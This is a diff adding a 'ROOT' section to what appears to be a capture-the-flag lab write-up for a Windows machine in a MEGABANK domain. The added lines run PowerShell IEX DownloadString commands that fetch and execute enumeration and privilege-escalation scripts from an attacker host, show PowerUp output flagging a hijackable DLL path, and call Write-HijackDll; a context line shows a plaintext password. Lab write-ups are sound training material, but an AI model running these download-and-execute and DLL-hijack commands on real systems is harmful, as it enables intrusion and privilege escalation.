@@ -113,3 +113,24 @@ melanie:Welcome123!
 We can then use this username and password with our best friend `evil-wimrm.rb` 
 
 To log on and grab the `user.txt`!
+
+# ROOT
+
+IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.80:8000/jaws-enum.ps1')
+IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.80:8000/PowerUp.ps1'); Invoke-AllChecks
+
+
+```
+[*] Checking %PATH% for potentially hijackable DLL locations...
+
+
+ModifiablePath    : C:\Users\melanie\AppData\Local\Microsoft\WindowsApps
+IdentityReference : MEGABANK\melanie
+Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
+%PATH%            : C:\Users\melanie\AppData\Local\Microsoft\WindowsApps
+AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\melanie\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'
+```
+
+IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.80:8000/PowerUp.ps1'); Write-HijackDll -DllPath 'C:\Users\melanie\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'
+
+IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.80:8000/Ikeext-Privesc.ps1'); Invoke-IkeextCheck
